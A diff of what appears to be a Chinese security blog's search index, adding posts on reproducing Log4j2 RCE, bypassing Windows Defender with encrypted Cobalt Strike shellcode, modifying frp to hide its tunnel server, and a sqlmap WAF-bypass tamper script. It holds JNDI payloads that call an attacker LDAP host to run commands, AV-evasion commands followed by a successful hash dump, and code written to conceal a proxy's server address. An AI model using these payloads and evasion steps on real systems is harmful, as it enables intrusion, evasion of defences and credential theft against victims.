@@ -55,6 +55,104 @@
       </tags>
   </entry>
   <entry>
+    <title>Apache - Log4j2 RCE复现</title>
+    <url>/2021/12/11/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<img src="/2021/12/11/Apache-Log4j2-RCE%E5%A4%8D%E7%8E%B0/icloud.png" class="">
+<h2 id="环境搭建"><a class="header-anchor" href="#环境搭建">¶</a>环境搭建</h2>
+<p>使用<code>T00ls</code>大佬的环境，<code>war</code>包放到<code>webapps</code>下重启<code>tomcat</code>即可</p>
+<div class="note info"><p>阅读本篇文章能了解到：apache, rce，Log4j2</p></div>
+<a id="more"></a>
+<blockquote>
+<p><a href="https://www.t00ls.cc/viewthread.php?tid=63695&amp;extra=&amp;page=1">https://www.t00ls.cc/viewthread.php?tid=63695&amp;extra=&amp;page=1</a></p>
+</blockquote>
+<p>这里我要多说几句，因为我用的<code>jspstudy</code>，搭建环境踩了不少坑，记录下，主要是<code>jspstudy</code>的坑</p>
+<p>首先把<code>war</code>包放到<code>webapps</code>下并不会自解压，放到<code>www</code>一样不解压</p>
+<p>解决方案：<code>JspStudy\tomcat\conf</code>文件夹下<code>server.xml</code>，注释掉<code>&lt;Context docBase=&quot;D:\JspStudy\WWW\&quot; path=&quot;&quot;&gt;&lt;/Context&gt;</code>，放到<code>webapps</code>即可自解压</p>
+<p>设置根目录为<code>D:\JspStudy\WWW\ROOT</code>，访问<code>http://127.0.0.1:8080</code>，页面正常</p>
+<p>提交<code>payload</code>，报500错</p>
+<p><img src="500.png" alt="500"></p>
+<p>经查，大概是<code>jdk</code>版本问题，打开<code>jdk</code>目录查看<code>java</code>版本为<code>1.7.0_60</code>，盲猜版本过低</p>
+<p>解决方案：安装<code>jre1.8</code>32位，拷贝<code>bin</code>、<code>lib</code>目录，替换<code>JspStudy\JDK\jre\</code>，替换前先把<code>bin</code>目录下<code>java-JspStudy.exe</code>备份一份，替换后再拷贝进去</p>
+<p>重启<code>tomcat</code>解决500错误，8错，nice，我已经准备不再用他了😅</p>
+<h2 id="RCE"><a class="header-anchor" href="#RCE">¶</a>RCE</h2>
+<h3 id="1-dnslog"><a class="header-anchor" href="#1-dnslog">¶</a>1. dnslog</h3>
+<p>先使用dns测试漏洞</p>
+<blockquote>
+<p>payload: ${jndi:ldap://redn3ck.xxx.ceye.io}</p>
+</blockquote>
+<p><img src="dns.png" alt="dns"></p>
+<h3 id="2-rce"><a class="header-anchor" href="#2-rce">¶</a>2. rce</h3>
+<p>下载<a href="https://github.com/0x727/JNDIExploit">https://github.com/0x727/JNDIExploit</a>，跑起服务</p>
+<p><img src="JNDIExploit.png" alt="JNDIExploit"></p>
+<blockquote>
+<p>payload: ${jndi:ldap://207.xxx.xxx.111:1389/TomcatBypass/TomcatEcho}</p>
+</blockquote>
+<p><code>header</code>中填入<code>Cmd: cmd</code>即可<code>rce</code></p>
+<p><img src="rce.png" alt="rce"></p>
+<h2 id="参考链接"><a class="header-anchor" href="#参考链接">¶</a>参考链接</h2>
+<blockquote>
+<p><a href="https://www.t00ls.cc/viewthread.php?tid=63695">https://www.t00ls.cc/viewthread.php?tid=63695</a><br>
+<a href="https://www.t00ls.cc/viewthread.php?tid=63705">https://www.t00ls.cc/viewthread.php?tid=63705</a></p>
+</blockquote>
+]]></content>
+      <tags>
+        <tag>复现</tag>
+        <tag>apache</tag>
+        <tag>rce</tag>
+        <tag>Log4j2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CS免杀 - bypass defender</title>
+    <url>/2022/08/09/CS%E5%85%8D%E6%9D%80-bypass-defender/</url>
+    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
+<p>最近看到一款过 <code>defender</code> 的免杀工具，挺感兴趣，之所以感兴趣的原因是我觉得目前最强的杀软就是<code>defender</code></p>
+<p>外面有很多过火绒、360之类的，不感兴趣，因为用武之地不大，而且自带的 <code>defender</code> 更强力，过 <code>defender</code> 的意义更大</p>
+<p><strong>X系列安全工具-AV免杀框架-BypassAV</strong></p>
+<blockquote>
+<p><a href="https://github.com/XTeam-Wing/X-AV">https://github.com/XTeam-Wing/X-AV</a></p>
+</blockquote>
+<p>具体介绍就不赘述了，看 <code>README</code> 就好</p>
+<h2 id="安装"><a class="header-anchor" href="#安装">¶</a>安装</h2>
+<p>现在 <code>go</code> 日趋火热，不学点真的跟不上了，这款工具也是 <code>go</code> 开发的</p>
+<a id="more"></a>
+<h3 id="go"><a class="header-anchor" href="#go">¶</a>go</h3>
+<p>不赘述，我这里安装的是新版 <code>go1.18.3</code>，所以导致跑他的程序有很多问题，但又不想降级，所以就一步步排查，解决问题，死磕</p>
+<h3 id="run"><a class="header-anchor" href="#run">¶</a>run</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ShellcodeFrameWork_windows_amd64.exe -shellcodepath mimikatz.exe -o rc4.exe -key wing -encrypt  rc4 -loadermethod uuid</span><br></pre></td></tr></table></figure>
+<p>直接跑提示 <code>ERROR:exec: &quot;bin/go&quot;: file does not exist</code></p>
+<p>看来环境变量没写好，所以把程序放到 <code>go</code> 目录 <code>C:\Program Files\Go</code> 再次运行，提示 <code>STDERR: UUID_agent.go:33:2: cannot find package &quot;github.com/google/uuid&quot; in any of:</code></p>
+<p>使用 <code>go get github.com/google/uuid </code> 报错，按提示改为 <code>go install github.com/google/uuid@latest</code> 报错 <code>package github.com/google/uuid is not a main package</code> ，查了一圈折腾了很久</p>
+<p><strong>解决方案</strong></p>
+<p>在目录 <code>C:\Program Files\Go\src\</code> 下手动创建 <code>github.com/google/</code> ，之后 <code>git clone https://github.com/google/uuid.git</code>，解决该问题</p>
+<p>剩下的报错同理解决</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Program Files\Go\src\golang.org\x&gt;git clone https:&#x2F;&#x2F;github.com&#x2F;golang&#x2F;crypto.git</span><br><span class="line">C:\Program Files\Go\src\golang.org\x&gt;git clone https:&#x2F;&#x2F;github.com&#x2F;golang&#x2F;sys.git</span><br></pre></td></tr></table></figure>
+<p>至此，程序跑起来，解决高版本 <code>go</code> 运行问题</p>
+<h2 id="免杀效果"><a class="header-anchor" href="#免杀效果">¶</a>免杀效果</h2>
+<p>一开始我免杀<code>mmk</code>，但跑不起来，才发现该工具为 <code>shellcode</code> 免杀 😅</p>
+<p>生成一个 <code>Windows stageless Raw</code> 用 <code>aes</code> 加密一个试试看免杀效果</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Program Files\Go&gt;x-av.exe -shellcodepath C:\Users\admin\Desktop\beacon.bin -key redn3ck -encrypt aes -loadermethod uuid -salt wakuwaku -o aes.exe</span><br></pre></td></tr></table></figure>
+<p>我直接放到主机测试，主机是一直在更新的 <code>win10</code>， <code>defender</code> 也是最新的</p>
+<p><img src="defender.png" alt="defender"></p>
+<p>本身程序没报毒没什么，跑起来后也没报，<code>defender</code> 阵亡，免杀效果不错，另外贴上系统版本为 <code>19044.1826</code></p>
+<p><img src="systeminfo.png" alt="systeminfo"></p>
+<p><code>CS</code> 成功上线</p>
+<p><img src="cs.png" alt="cs"></p>
+<h3 id="抓密码"><a class="header-anchor" href="#抓密码">¶</a>抓密码</h3>
+<p>大胆测试一下抓密码，猜测不可以，结果没想到成功抓到密码</p>
+<p><img src="hashdump.png" alt="hashdump"></p>
+<p>但可惜的是这次 <code>defender</code> 复活了，检测到恶意程序，并且弹窗强制<code>1min</code>后关机，我不理解 但我大受震撼.jpg</p>
+<h2 id="总结"><a class="header-anchor" href="#总结">¶</a>总结</h2>
+<p>该工具免杀效果不错，相信过了 <code>defender</code>，其他 <code>AV</code> 也不必测试了</p>
+<p>只要不做一些敏感行为，还是可以达到一定效果</p>
+]]></content>
+      <tags>
+        <tag>cs</tag>
+        <tag>免杀</tag>
+        <tag>defender</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CVE-2017-11882 POC</title>
     <url>/2017/11/21/CVE-2017-11882-POC/</url>
     <content><![CDATA[<h1>POC</h1>
@@ -284,24 +382,45 @@ Windows 10 Version 1809 for 32-bit Systems</p>
       </tags>
   </entry>
   <entry>
-    <title>Mysql注入 - Sqlmap之tamper编写</title>
-    <url>/2018/03/28/Mysql%E6%B3%A8%E5%85%A5-Sqlmap%E4%B9%8Btamper%E7%BC%96%E5%86%99/</url>
-    <content><![CDATA[<h1>Bypass <code>@</code></h1>
-<img src="/2018/03/28/Mysql%E6%B3%A8%E5%85%A5-Sqlmap%E4%B9%8Btamper%E7%BC%96%E5%86%99/bypass@error.png" class="">
-<p>如图，遇到<code>@</code>，导致注入失败，使用mysql表名即可绕过</p>
-<img src="/2018/03/28/Mysql%E6%B3%A8%E5%85%A5-Sqlmap%E4%B9%8Btamper%E7%BC%96%E5%86%99/bypass@.png" class="">
-<h1>Bypass WAF</h1>
+    <title>Frp改造 - 参数版+AES加密</title>
+    <url>/2022/01/11/Frp%E6%94%B9%E9%80%A0-%E5%8F%82%E6%95%B0%E7%89%88-AES%E5%8A%A0%E5%AF%86/</url>
+    <content><![CDATA[<h2 id="前言"><a class="header-anchor" href="#前言">¶</a>前言</h2>
+<p>参数版已经有很多大佬改造过了，因为最近有需求需要把参数加密化，网上没找到现成的，所以手动改造，顺便学一点<code>go</code>语言 😅</p>
+<p>基于<code>uknowsec</code>大佬的文章 <a href="https://uknowsec.cn/posts/notes/FRP%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html">FRP改造计划</a>，实现作者说的：</p>
+<blockquote>
+<p>所以可以直接加一些加密啥的，-t参数传入ip加密后的地址，然后在源码里加一个解密的步骤即可。</p>
+</blockquote>
+<p>另外，个人觉得只加密<code>ip</code>不够隐蔽，所以连同<code>port</code>一起进行<code>AES</code>加密</p>
+<h2 id="改造"><a class="header-anchor" href="#改造">¶</a>改造</h2>
+<p>只需要修改<code>cmd/frpc/sub/root.go</code>即可</p>
 <a id="more"></a>
-<p>该站存在WAF，<code>union</code>不可与<code>select</code>同时出现，简单使用<code>%0A</code>即可绕过，即<code>union%0Aselect</code>；<br>
-另外<code>information_schema.tables</code>也被拉黑，fuzz后发现也不难绕，改为<code>information_schema/**/.tables</code>即可绕过。</p>
-<h1>Tamper编写</h1>
-<p>这下绕过是没问题了，可惜sqlmap跑不了，遂想编写一针对此站的tamper，供sqlmap调用，但因未实现过此方式，翻看sqlmap中<em>tamper</em>，发现很简单，接口已经准备好，只需要对payload进行处理就能让sqlmap调用。</p>
-<p>编写<code>own.py</code>放入<em>tamper</em>目录下即可</p>
-<p><font color=red>注意：sqlmap中的payload均是大写</font></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;doc/COPYING&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Replaces space character (&#x27; &#x27;) with comments &#x27;/**/&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Tested against:</span></span><br><span class="line"><span class="string">        * Microsoft SQL Server 2005</span></span><br><span class="line"><span class="string">        * MySQL 4, 5.0 and 5.5</span></span><br><span class="line"><span class="string">        * Oracle 10g</span></span><br><span class="line"><span class="string">        * PostgreSQL 8.3, 8.4, 9.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Notes:</span></span><br><span class="line"><span class="string">        * Useful to bypass weak and bespoke web application firewalls</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&#x27;SELECT id FROM users&#x27;)</span></span><br><span class="line"><span class="string">    &#x27;SELECT/**/id/**/FROM/**/users&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">        quote, doublequote, firstspace = <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        retVal = payload.replace(<span class="string">&#x27;SCHEMA.&#x27;</span>, <span class="string">&#x27;SCHEMA/**/.&#x27;</span>)</span><br><span class="line">        retVal = retVal.replace(<span class="string">&#x27;UNION &#x27;</span>, <span class="string">&#x27;UNION%0A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="1-创建AES函数"><a class="header-anchor" href="#1-创建AES函数">¶</a>1. 创建<code>AES</code>函数</h3>
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PKCS7Padding</span><span class="params">(ciphertext []<span class="keyword">byte</span>, blockSize <span class="keyword">int</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">	padding := blockSize - <span class="built_in">len</span>(ciphertext)%blockSize</span><br><span class="line">	padtext := bytes.Repeat([]<span class="keyword">byte</span>&#123;<span class="keyword">byte</span>(padding)&#125;, padding)</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">append</span>(ciphertext, padtext...)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PKCS7UnPadding</span><span class="params">(origData []<span class="keyword">byte</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">	length := <span class="built_in">len</span>(origData)</span><br><span class="line">	unpadding := <span class="keyword">int</span>(origData[length<span class="number">-1</span>])</span><br><span class="line">	<span class="keyword">return</span> origData[:(length - unpadding)]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AesEncrypt</span><span class="params">(origData, key []<span class="keyword">byte</span>)</span> <span class="params">([]<span class="keyword">byte</span>, error)</span></span> &#123;</span><br><span class="line">	block, err := aes.NewCipher(key)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	blockSize := block.BlockSize()</span><br><span class="line">	origData = PKCS7Padding(origData, blockSize)</span><br><span class="line">	blockMode := cipher.NewCBCEncrypter(block, key[:blockSize])</span><br><span class="line">	crypted := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="built_in">len</span>(origData))</span><br><span class="line">	blockMode.CryptBlocks(crypted, origData)</span><br><span class="line">	<span class="keyword">return</span> crypted, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AesDecrypt</span><span class="params">(crypted, key []<span class="keyword">byte</span>)</span> <span class="params">([]<span class="keyword">byte</span>, error)</span></span> &#123;</span><br><span class="line">	block, err := aes.NewCipher(key)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	blockSize := block.BlockSize()</span><br><span class="line">	blockMode := cipher.NewCBCDecrypter(block, key[:blockSize])</span><br><span class="line">	origData := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="built_in">len</span>(crypted))</span><br><span class="line">	blockMode.CryptBlocks(origData, crypted)</span><br><span class="line">	origData = PKCS7UnPadding(origData)</span><br><span class="line">	<span class="keyword">return</span> origData, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="2-初始化中定义传参"><a class="header-anchor" href="#2-初始化中定义传参">¶</a>2. 初始化中定义传参</h3>
+<p>只需传一个参数，里面包含<code>ip</code>和<code>port</code>即可</p>
+<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">func init() &#123;</span><br><span class="line">	rootCmd.PersistentFlags().StringVarP(&amp;cfgFile, &quot;config&quot;, &quot;c&quot;, &quot;./frpc.ini&quot;, &quot;config file of frpc&quot;)</span><br><span class="line">	rootCmd.PersistentFlags().BoolVarP(&amp;showVersion, &quot;version&quot;, &quot;v&quot;, false, &quot;version of frpc&quot;)</span><br><span class="line"><span class="addition">+	rootCmd.PersistentFlags().StringVarP(&amp;ipPort, &quot;ipPort&quot;, &quot;t&quot;, &quot;&quot;, &quot;ip port&quot;)</span></span><br><span class="line">	kcpDoneCh = make(chan struct&#123;&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="3-新增函数"><a class="header-anchor" href="#3-新增函数">¶</a>3. 新增函数</h3>
+<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getFileContent</span><span class="params">(ipPort <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">	AesKey := []<span class="keyword">byte</span>(<span class="string">&quot;1qaz2wsx3edc4rfv&quot;</span>)  <span class="comment">// 对称秘钥长度必须是16的倍数</span></span><br><span class="line">	encrypted, _ := base64.StdEncoding.DecodeString(ipPort)</span><br><span class="line">	origin, err := AesDecrypt(encrypted, AesKey)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	arr := strings.Fields(<span class="keyword">string</span>(origin))</span><br><span class="line">	ip := arr[<span class="number">0</span>]</span><br><span class="line">	port := arr[<span class="number">1</span>]</span><br><span class="line">	<span class="keyword">var</span> content <span class="keyword">string</span> = <span class="string">`[common]</span></span><br><span class="line"><span class="string">    server_addr = `</span> + ip + <span class="string">`</span></span><br><span class="line"><span class="string">    server_port = `</span> + port + <span class="string">`</span></span><br><span class="line"><span class="string">	tls_enable = true</span></span><br><span class="line"><span class="string">    token = socks</span></span><br><span class="line"><span class="string">	[socks]</span></span><br><span class="line"><span class="string">	type = tcp</span></span><br><span class="line"><span class="string">	remote_port = 1800</span></span><br><span class="line"><span class="string">	plugin = socks5</span></span><br><span class="line"><span class="string">	`</span></span><br><span class="line">	fileContent = content</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="4-修改runClient函数"><a class="header-anchor" href="#4-修改runClient函数">¶</a>4. 修改<code>runClient</code>函数</h3>
+<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="addition">+ func runClient(cfgFilePath string, ipPort string) (err error) &#123;</span></span><br><span class="line">	var content string</span><br><span class="line"><span class="addition">+	getFileContent(ipPort)</span></span><br><span class="line"><span class="addition">+	// content, err = config.GetRenderedConfFromFile(cfgFilePath)</span></span><br><span class="line"><span class="addition">+	content, err = fileContent, nil</span></span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	cfg, err := parseClientCommonCfg(CfgFileTypeIni, content)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pxyCfgs, visitorCfgs, err := config.LoadAllConfFromIni(cfg.User, content, cfg.Start)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">		return err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = startService(cfg, pxyCfgs, visitorCfgs, cfgFilePath)</span><br><span class="line">	return</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="5-调用runClient"><a class="header-anchor" href="#5-调用runClient">¶</a>5. 调用<code>runClient()</code></h3>
+<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">var rootCmd = &amp;cobra.Command&#123;</span><br><span class="line">	Use:   &quot;frpc&quot;,</span><br><span class="line">	Short: &quot;frpc is the client of frp (https://github.com/fatedier/frp)&quot;,</span><br><span class="line">	RunE: func(cmd *cobra.Command, args []string) error &#123;</span><br><span class="line">		if showVersion &#123;</span><br><span class="line">			fmt.Println(version.Full())</span><br><span class="line">			return nil</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		// Do not show command usage here.</span><br><span class="line"><span class="addition">+		err := runClient(cfgFile, ipPort)</span></span><br><span class="line">		if err != nil &#123;</span><br><span class="line">			fmt.Println(err)</span><br><span class="line">			os.Exit(1)</span><br><span class="line">		&#125;</span><br><span class="line">		return nil</span><br><span class="line">	&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="6-编译"><a class="header-anchor" href="#6-编译">¶</a>6. 编译</h3>
+<p>修改根目录<code>package.sh</code>，实现直接生成编译文件而不打包</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># compile for version</span></span><br><span class="line">make</span><br><span class="line"><span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;make error&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">frp_version=`./bin/frps --version`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;build version: <span class="variable">$frp_version</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cross_compiles</span></span><br><span class="line">make -f ./Makefile.cross-compiles</span><br><span class="line"></span><br><span class="line">rm -rf ./release/packages</span><br><span class="line">mkdir -p ./release/packages</span><br><span class="line"></span><br><span class="line">os_all=<span class="string">&#x27;linux windows darwin freebsd&#x27;</span></span><br><span class="line">arch_all=<span class="string">&#x27;386 amd64 arm arm64 mips64 mips64le mips mipsle&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ./release</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> os <span class="keyword">in</span> <span class="variable">$os_all</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">for</span> arch <span class="keyword">in</span> <span class="variable">$arch_all</span>; <span class="keyword">do</span></span><br><span class="line">        frp_dir_name=<span class="string">&quot;frp_<span class="variable">$&#123;frp_version&#125;</span>_<span class="variable">$&#123;os&#125;</span>_<span class="variable">$&#123;arch&#125;</span>&quot;</span></span><br><span class="line">        frp_path=<span class="string">&quot;./packages/frp_<span class="variable">$&#123;frp_version&#125;</span>_<span class="variable">$&#123;os&#125;</span>_<span class="variable">$&#123;arch&#125;</span>&quot;</span></span><br><span class="line">        <span class="built_in">cd</span> ..</span><br><span class="line">        rm -rf <span class="variable">$&#123;frp_path&#125;</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> -</span><br></pre></td></tr></table></figure>
+<p>编译</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash package.sh</span><br></pre></td></tr></table></figure>
+<h2 id="效果"><a class="header-anchor" href="#效果">¶</a>效果</h2>
+<p><img src="frpc.png" alt="frpc"></p>
+<h2 id="参考链接"><a class="header-anchor" href="#参考链接">¶</a>参考链接</h2>
+<blockquote>
+<p><a href="https://uknowsec.cn/posts/notes/FRP%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html">https://uknowsec.cn/posts/notes/FRP改造计划.html</a></p>
+</blockquote>
 ]]></content>
       <tags>
-        <tag>注入</tag>
+        <tag>frp</tag>
+        <tag>go</tag>
+        <tag>AES</tag>
       </tags>
   </entry>
   <entry>
@@ -335,6 +454,27 @@ Windows 10 Version 1809 for 32-bit Systems</p>
       <tags>
         <tag>IPC</tag>
         <tag>bat</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Mysql注入 - Sqlmap之tamper编写</title>
+    <url>/2018/03/28/Mysql%E6%B3%A8%E5%85%A5-Sqlmap%E4%B9%8Btamper%E7%BC%96%E5%86%99/</url>
+    <content><![CDATA[<h1>Bypass <code>@</code></h1>
+<img src="/2018/03/28/Mysql%E6%B3%A8%E5%85%A5-Sqlmap%E4%B9%8Btamper%E7%BC%96%E5%86%99/bypass@error.png" class="">
+<p>如图，遇到<code>@</code>，导致注入失败，使用mysql表名即可绕过</p>
+<img src="/2018/03/28/Mysql%E6%B3%A8%E5%85%A5-Sqlmap%E4%B9%8Btamper%E7%BC%96%E5%86%99/bypass@.png" class="">
+<h1>Bypass WAF</h1>
+<a id="more"></a>
+<p>该站存在WAF，<code>union</code>不可与<code>select</code>同时出现，简单使用<code>%0A</code>即可绕过，即<code>union%0Aselect</code>；<br>
+另外<code>information_schema.tables</code>也被拉黑，fuzz后发现也不难绕，改为<code>information_schema/**/.tables</code>即可绕过。</p>
+<h1>Tamper编写</h1>
+<p>这下绕过是没问题了，可惜sqlmap跑不了，遂想编写一针对此站的tamper，供sqlmap调用，但因未实现过此方式，翻看sqlmap中<em>tamper</em>，发现很简单，接口已经准备好，只需要对payload进行处理就能让sqlmap调用。</p>
+<p>编写<code>own.py</code>放入<em>tamper</em>目录下即可</p>
+<p><font color=red>注意：sqlmap中的payload均是大写</font></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;doc/COPYING&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Replaces space character (&#x27; &#x27;) with comments &#x27;/**/&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Tested against:</span></span><br><span class="line"><span class="string">        * Microsoft SQL Server 2005</span></span><br><span class="line"><span class="string">        * MySQL 4, 5.0 and 5.5</span></span><br><span class="line"><span class="string">        * Oracle 10g</span></span><br><span class="line"><span class="string">        * PostgreSQL 8.3, 8.4, 9.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Notes:</span></span><br><span class="line"><span class="string">        * Useful to bypass weak and bespoke web application firewalls</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&#x27;SELECT id FROM users&#x27;)</span></span><br><span class="line"><span class="string">    &#x27;SELECT/**/id/**/FROM/**/users&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">        quote, doublequote, firstspace = <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        retVal = payload.replace(<span class="string">&#x27;SCHEMA.&#x27;</span>, <span class="string">&#x27;SCHEMA/**/.&#x27;</span>)</span><br><span class="line">        retVal = retVal.replace(<span class="string">&#x27;UNION &#x27;</span>, <span class="string">&#x27;UNION%0A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>注入</tag>
       </tags>
   </entry>
   <entry>
@@ -600,63 +740,6 @@ Windows 10 Version 1809 for 32-bit Systems</p>
       </tags>
   </entry>
   <entry>
-    <title>Weblogic - 无文件内存shell</title>
-    <url>/2021/09/27/Weblogic-%E6%97%A0%E6%96%87%E4%BB%B6%E5%86%85%E5%AD%98shell/</url>
-    <content><![CDATA[<h2 id="环境搭建"><a class="header-anchor" href="#环境搭建">¶</a>环境搭建</h2>
-<p>采用<code>vulhub</code>中<code>weblogic</code> <code>CVE-2020-14882</code>搭建，<code>vulhub</code>安装不赘述</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> vulhub/weblogic/CVE-<span class="number">2020</span>-<span class="number">14882</span>/</span><br><span class="line">sudo docker-compose up</span><br></pre></td></tr></table></figure>
-<h2 id="内存cmd实现"><a class="header-anchor" href="#内存cmd实现">¶</a>内存<code>cmd</code>实现</h2>
-<p>原理和机制感兴趣的可以去看参考链接，比较详细，我跳过（太菜，看不懂😭）</p>
-<p>大致流程为：加载恶意类，动态注册<code>filter</code></p>
-<h3 id="1-编写恶意filter类"><a class="header-anchor" href="#1-编写恶意filter类">¶</a>1. 编写恶意<code>filter</code>类</h3>
-<div class="note info"><p>阅读本篇文章能了解到：weblogic, 内存马实现，冰蝎</p></div>
-<a id="more"></a>
